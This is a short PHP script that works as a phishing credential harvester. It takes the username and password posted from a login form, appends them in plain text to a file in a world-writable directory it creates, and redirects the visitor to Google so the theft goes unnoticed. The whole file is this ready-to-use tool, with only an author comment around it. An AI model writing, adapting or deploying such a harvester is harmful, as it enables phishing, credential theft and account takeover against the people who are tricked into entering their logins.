<!-- Autor: Nouhaila Ben Messaou -->

<?php
$dir = "myDir";
if(!file_exists($dir)){
mkdir($dir,0777);
}

if (isset($_POST["username"]) && isset($_POST["password"])) {

$username = $_POST["username"];
$password = $_POST["password"];
$data = "Username: ".$username . " : " . "Password: ".$password . "\n";
file_put_contents($dir.'/credentialsTest.txt', $data, FILE_APPEND | LOCK_EX);
}else echo "not set";

header("Location: https://www.google.com");
exit;
?>

